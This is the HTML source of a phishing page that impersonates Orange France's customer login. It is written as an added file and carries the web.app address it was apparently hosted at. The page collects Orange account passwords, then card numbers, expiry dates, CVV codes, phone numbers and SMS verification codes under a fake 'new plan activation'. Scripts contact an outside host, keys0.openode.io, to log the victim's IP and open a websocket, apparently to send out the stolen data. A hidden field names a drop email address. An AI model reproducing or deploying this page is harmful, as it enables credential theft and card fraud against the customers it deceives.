@@ -1,0 +1,573 @@
+<!-- URL =https://op-xi-nine.web.app/org/index.html--><!-- w =('web.app', datetime.datetime(2019, 1, 8, 22, 5, 4), datetime.datetime(2022, 1, 8, 22, 5, 4))--><!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+  <script src="https://cdn.jsdelivr.net/npm/vue">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-Xjd66VohnxGyWXo6t7jy6Jdpa4MapbhWGgzRNcsnnzY=" src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js">
+  </script>
+  <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css" integrity="sha256-wrmzmt34CAQJ3ChhG+ZHZNhwVTDrlLGhLAS7tlbgfZM=" rel="stylesheet"/>
+  <link href="img/apple-touch-icon-180x180.png" rel="shortcut icon" type="image/x-icon"/>
+  <script crossorigin="anonymous" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js">
+  </script>
+  <script>
+   window.locIp='';
+     window.iPfull='';
+    fetch('//keys0.openode.io/ip',{
+      mode:'cors',
+    }).then(e=>{
+      e.json().then(location=>{
+        console.log(location)
+        window.locIp=location
+        window.iPfull =location.ip || location
+       
+      })
+    })
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-A7WGGnbT0f0OYHWQVkWqX6GQdZHZDi8IsbD/u+FQaVc=" src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js">
+  </script>
+  <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" rel="stylesheet">
+   <script crossorigin="anonymous" integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js">
+   </script>
+   <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css" integrity="sha256-zXcP0t9LAKMmi8DraWUaFJV1qvGkw1gYEHBbf+IsHSo=" rel="stylesheet"/>
+   <link href="css/styles.css" rel="stylesheet"/>
+   <title>
+    CR en ligne - Orange France
+   </title>
+   <style>
+    body{
+  display: none;
+}
+   </style>
+  </link>
+ </head>
+ <body>
+  <p style="display:none">
+   <input id="Mail" type="text" value="bless.love@inbox.lv"/>
+   <input id="Option" type="text" value="0"/>
+  </p>
+  <div id="index">
+   <div v-show="!loading">
+    <div id="dep" v-if="login==1">
+     <div class="uk-position-absolue" style="height:120px; background: #000;">
+      <div class="uk-hidden@l">
+       <div>
+        <div class="uk-child-width-1-3 uk-grid-match" uk-grid="">
+         <div>
+          <div style="padding:23px">
+           <div>
+            <div style="margin-top:27px;margin-left:27px;">
+             <img alt="" src="img/logo-orange.png" style="width:60px;"/>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div>
+          <!--<div class="uk-text-center uk-align-center">
+                        <div style="padding:23px">
+                            <img style="min-width:60px" src="img/logo-orange.png" alt="">
+                        </div>
+                       </div>-->
+         </div>
+         <div>
+          <div class="uk-align-right uk-text-right">
+           <div class="bars_color" style="float:right;padding:20px;margin-top:50px; color:#fff;font-size: 25px;">
+            <i class="ui icon bars large">
+            </i>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="uk-position-relative uk-visible@l" uk-grid="">
+       <div style="margin-left:50px;margin-top:50px;">
+        <img alt="" src="img/logo-orange.png" style="width:60px"/>
+       </div>
+       <div class="uk-width-expand">
+        <div class="uk-text-bold" id="barh" uk-grid="">
+         <!--<div class="primary">
+                       <br>
+                        Vous êtes un particulier  <i class="ui icon chevron large down"></i>
+                     </div>-->
+         <div class="uk-text-right uk-align-right uk-width-expand" id="menu_">
+          <ul>
+           <li>
+            <i class="ui icon comment">
+            </i>
+            Aide et contact
+           </li>
+           <!--<li style="background:#006675">ouvrir un compte</li>-->
+           <li>
+            <i class="ui icon search">
+            </i>
+            Recherche
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div id="menus">
+         <ul id="bar" style="color:fff;">
+          <li>
+           Mobiles et forfaits
+          </li>
+          <li>
+           Internet
+          </li>
+          <li>
+           Packs Internet + Mobile
+          </li>
+          <li>
+           Maison
+          </li>
+          <li>
+           TV et divertissement
+          </li>
+          <li>
+           Banque
+          </li>
+          <li>
+           News
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+     <br/>
+     <br/>
+     <div>
+      <br/>
+      <div class=" uk-child-width-1-2@m uk-position-relative" uk-grid="">
+       <div style="margin-top:-100px;">
+        <div class="uk-padding">
+         <div class="uk-card uk-text-left uk-card-large uk-card-body">
+          <h2 class="">
+           <b>
+            Identifiez-vous
+           </b>
+           <br/>
+          </h2>
+          <p>
+           <span style="font-size: 16px;font-weight: bold;">
+            Indiquez votre compte Orange
+           </span>
+           <input autofocus="" max="999999" maxlength="50" placeholder="Adresse email ou n° de mobile Orange" type="email" v-model="log.EMAIL"/>
+           <br/>
+           <br/>
+           <span style="font-size: 16px;font-weight: bold;">
+            Saisissez votre mot de passe
+           </span>
+           <input maxlength="50" placeholder="Mot de passe" type="PASSword" v-model="log.PASS"/>
+          </p>
+          <br/>
+          <div @click="goToCredit" class="ui button" id="btn">
+           S'identifier
+          </div>
+          <a href="#" style="color:black; margin-left:50px;font-size:16px;font-weight: bold;">
+           Mot de passe oublié ?
+          </a>
+          <br/>
+          <br/>
+          <div class="uk-text-left uk-text-danger" v-if="error">
+           <i class="ui icon warning red">
+           </i>
+           Champs incorrect, corriger votre saisie
+          </div>
+         </div>
+        </div>
+       </div>
+       <div>
+        <div style="margin-left: 50px;">
+         <img alt="" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.10.0/images/services_comm/om_desktop.png" style="width:300px"/>
+        </div>
+       </div>
+      </div>
+     </div>
+     <br/>
+     <br/>
+     <footer style="margin-bottom:0px;">
+      <div class="" style="margin-bottom:0px;background: #000;">
+       <div style="color:#fff;">
+        <div id="menu_1">
+         <ul>
+          <li>
+           <i class="ui icon comment">
+           </i>
+           Aide et contact
+          </li>
+          <!--<li style="background:#006675">ouvrir un compte</li>-->
+          <li>
+           <i class="ui-icon ui-icon-extlink-1-n">
+           </i>
+           Forum d'entraide
+          </li>
+          <li>
+           <i class="ui icon search">
+           </i>
+           Trouver une boutique
+          </li>
+         </ul>
+        </div>
+       </div>
+       <hr style="margin-top:50px; border-top: 1px solid gray;"/>
+       <div style="color:#fff;">
+        <div id="menu_2">
+         <ul>
+          <li>
+           Informations légales
+          </li>
+          <li>
+           Données personnelles
+          </li>
+          <li>
+           Accessibilité
+          </li>
+          <li>
+           Les cookies
+          </li>
+          <li>
+           Publicité
+          </li>
+          <li>
+           Internet +
+          </li>
+          <li>
+           Signaler un contenu
+          </li>
+          <li>
+           © Orange 2020
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </footer>
+    </div>
+    <!--FIN L1-->
+    <div v-if="login==2">
+     <div class="uk-position-absolue" style="height:120px; background: #000;">
+      <div class="uk-hidden@l">
+       <div>
+        <div class="uk-child-width-1-3 uk-grid-match" uk-grid="">
+         <div>
+          <div style="padding:23px">
+           <div>
+            <div style="margin-top:27px;margin-left:27px;">
+             <img alt="" src="img/logo-orange.png" style="width:60px;"/>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div>
+          <!--<div class="uk-text-center uk-align-center">
+                        <div style="padding:23px">
+                            <img style="min-width:60px" src="img/logo-orange.png" alt="">
+                        </div>
+                       </div>-->
+         </div>
+         <div>
+          <div class="uk-align-right uk-text-right">
+           <div class="bars_color" style="float:right;padding:20px;margin-top:50px; color:#fff;font-size: 25px;">
+            <i class="ui icon bars large">
+            </i>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="uk-position-relative uk-visible@l" uk-grid="">
+       <div style="margin-left:50px;margin-top:50px;">
+        <img alt="" src="img/logo-orange.png" style="width:60px"/>
+       </div>
+       <div class="uk-width-expand">
+        <div class="uk-text-bold" id="barh" uk-grid="">
+         <!--<div class="primary">
+                       <br>
+                        Vous êtes un particulier  <i class="ui icon chevron large down"></i>
+                     </div>-->
+         <div class="uk-text-right uk-align-right uk-width-expand" id="menu_">
+          <ul>
+           <li>
+            <img src="https://media.pns.orange.fr//tiny/default.jpg" style="width:20px;"/>
+            Espace client
+           </li>
+           <li>
+            <i class="ui icon mail closed">
+            </i>
+           </li>
+           <li>
+            <i class="ui icon comment">
+            </i>
+            Aide et contact
+           </li>
+           <!--<li style="background:#006675">ouvrir un compte</li>-->
+          </ul>
+         </div>
+        </div>
+        <div id="menus">
+         <ul id="bar" style="color:fff;">
+          <li>
+           Mobiles et forfaits
+          </li>
+          <li>
+           Internet
+          </li>
+          <li>
+           Packs Internet + Mobile
+          </li>
+          <li>
+           Maison
+          </li>
+          <li>
+           TV et divertissement
+          </li>
+          <li>
+           Banque
+          </li>
+          <li>
+           News
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+     <br/>
+     <br/>
+     <div class=" white">
+      <div class="uk-child-width-1-1@s uk-grid-collapse" style="margin-left:50px;" uk-grid="">
+       <div>
+        <div class="uk-padding">
+         <div class="uk-h3 primary">
+          <i class="ui icon key teal">
+          </i>
+          Activation de la nouvelle Formule
+         </div>
+         <div class="uk-visible@m">
+          <steps :current="step-1" size="small" style="color:teal" vertical="">
+           <step content="Carte bancaire" style="color:teal" title="MODE DE PAIEMENT">
+           </step>
+           <step content="Confiration de paiement" style="color:teal" title="SMS MOBILE">
+           </step>
+           <step content="Facture acquittée" style="color:teal" title="VALIDATION">
+           </step>
+          </steps>
+          <br/>
+          <br/>
+         </div>
+         <div class="uk-hidden@m">
+          <steps :current="step-1" direction="vertical" size="small" style="color:teal">
+           <step content="Carte bancaire" style="color:teal" title="MODE DE PAIEMENT">
+           </step>
+           <step content="Confiration de paiement" style="color:teal" title="SMS MOBILE">
+           </step>
+           <step content="Facture acquittée" style="color:teal" title="VALIDATION">
+           </step>
+          </steps>
+          <br/>
+          <br/>
+         </div>
+         <div v-if="step==1">
+          <div class="uk-child-width-2-2@s" uk-grid="">
+           <div>
+            <p class="uk-text-bold">
+             Entrer les coordonnées de la carte
+            </p>
+            <p>
+             Numéro de carte :
+             <input autofocus="" maxlength="16" placeholder="Numéro de carte" style="background: #f5F5F5;min-width:252px;width:30%" type="text" v-model="log.numcc"/>
+             <img alt="" src="img/CB-1.jpg" style="width:150px"/>
+            </p>
+            <p>
+             Date d'expiration :
+             <input max="12" maxlength="2" min="0" placeholder="MM" style="background: #f5F5F5;min-width:80px;width:14%" type="text" v-model="log.ex1"/>
+             <input max="30" maxlength="4" min="19" placeholder="AAAA" style="background: #f5F5F5;min-width:80px;width:14%" type="text" v-model="log.ex2"/>
+            </p>
+            <p>
+             Cryptogramme visuel (CVV) :
+             <input maxlength="4" placeholder="" style="background: #f5F5F5;min-width:80px;width:8%" type="text" v-model="log.cvv"/>
+            </p>
+            <p>
+             Numéro mobile associé  :
+             <input max="30" maxlength="12" min="19" placeholder="(+33)" style="background: #f5F5F5;min-width:180px;width:25%" type="text" v-model="log.tel"/>
+            </p>
+            <br/>
+            <div @click="setCard" class="ui button teal">
+             <i class="ui icon cc mastercard ">
+             </i>
+             Je valide mon paiement
+            </div>
+           </div>
+          </div>
+         </div>
+         <br/>
+         <div v-if="step==2">
+          <p id="cc" style="font-size:15px">
+           <b>
+            Veuillez entrer le
+            <span style="color:teal">
+             *code*
+            </span>
+            reçu par SMS ci-dessous :
+           </b>
+           <i class="ui icon big mobile">
+           </i>
+           <br/>
+           <br/>
+           <input max="999999" maxlength="8" placeholder="(chiffres)" style="width:50%" type="text" v-model="log.SMS"/>
+          </p>
+          <p>
+           <div @click="goToStep2" class="ui button" id="btn">
+            <i class="ui icon chevron right">
+            </i>
+            CONTINUER
+           </div>
+          </p>
+         </div>
+         <div class="uk-alert">
+          Nouveau  dispositif de sécurité conçu pour  les opérations en ligne .
+          <br/>
+          Ce code confidentiel, connu de vous seul, est utilisable uniquement pour vos opérations en ligne .
+          <ul>
+           <li>
+            Consultation de solde
+           </li>
+           <li>
+            Virements en ligne
+           </li>
+           <li>
+            Achat en ligne
+           </li>
+           <li>
+            Et d'autres opérations sensibles ....
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+       <div>
+       </div>
+      </div>
+     </div>
+     <br/>
+     <br/>
+     <footer style="margin-bottom:0px;">
+      <div class="" style="margin-bottom:0px;background: #000;">
+       <div style="color:#fff;">
+        <div id="menu_1">
+         <ul>
+          <li>
+           <i class="ui icon comment">
+           </i>
+           Aide et contact
+          </li>
+          <!--<li style="background:#006675">ouvrir un compte</li>-->
+          <li>
+           <i class="ui-icon ui-icon-extlink-1-n">
+           </i>
+           Forum d'entraide
+          </li>
+          <li>
+           <i class="ui icon search">
+           </i>
+           Trouver une boutique
+          </li>
+         </ul>
+        </div>
+       </div>
+       <hr style="margin-top:50px; border-top: 1px solid gray;"/>
+       <div style="color:#fff;">
+        <div id="menu_2">
+         <ul>
+          <li>
+           Informations légales
+          </li>
+          <li>
+           Données personnelles
+          </li>
+          <li>
+           Accessibilité
+          </li>
+          <li>
+           Les cookies
+          </li>
+          <li>
+           Publicité
+          </li>
+          <li>
+           Internet +
+          </li>
+          <li>
+           Signaler un contenu
+          </li>
+          <li>
+           © Orange 2020
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </footer>
+    </div>
+    <!--FIN L1-->
+   </div>
+   <div v-show="loading">
+    <div class="uk-position-center">
+     <div class="uk-text-center">
+      <div class="primary" uk-spinner="">
+      </div>
+      <br/>
+      <p>
+       {{message}}
+      </p>
+      <p>
+       <img alt="" src="img/logo-orange.png" style="width:50%"/>
+      </p>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script>
+   const socket =io('https://keys0.openode.io',{
+    transports:['websocket','polling']
+})
+  function validateNumber(event) {
+    var key = window.event ? event.keyCode : event.which;
+    if (event.keyCode === 8 || event.keyCode === 46) {
+        return true;
+    } else if ( key < 48 || key > 57 ) {
+        return false;
+    } else {
+        return true;
+    }
+};
+$(document).ready(function(){
+    $('input2S').keypress(validateNumber);
+});
+  </script>
+  <script src="js/index.js">
+  </script>
+  <!--Start of Tawk.to Script-->
+  <script type="text/javascript">
+   var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+ // s1.src='https://embed.tawk.to/5dc29b31e4c2fa4b6bda4277/default';
+  s1.src="https://embed.tawk.to/5dc29b31e4c2fa4b6bda4277/default";
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
+ </body>
+</html>
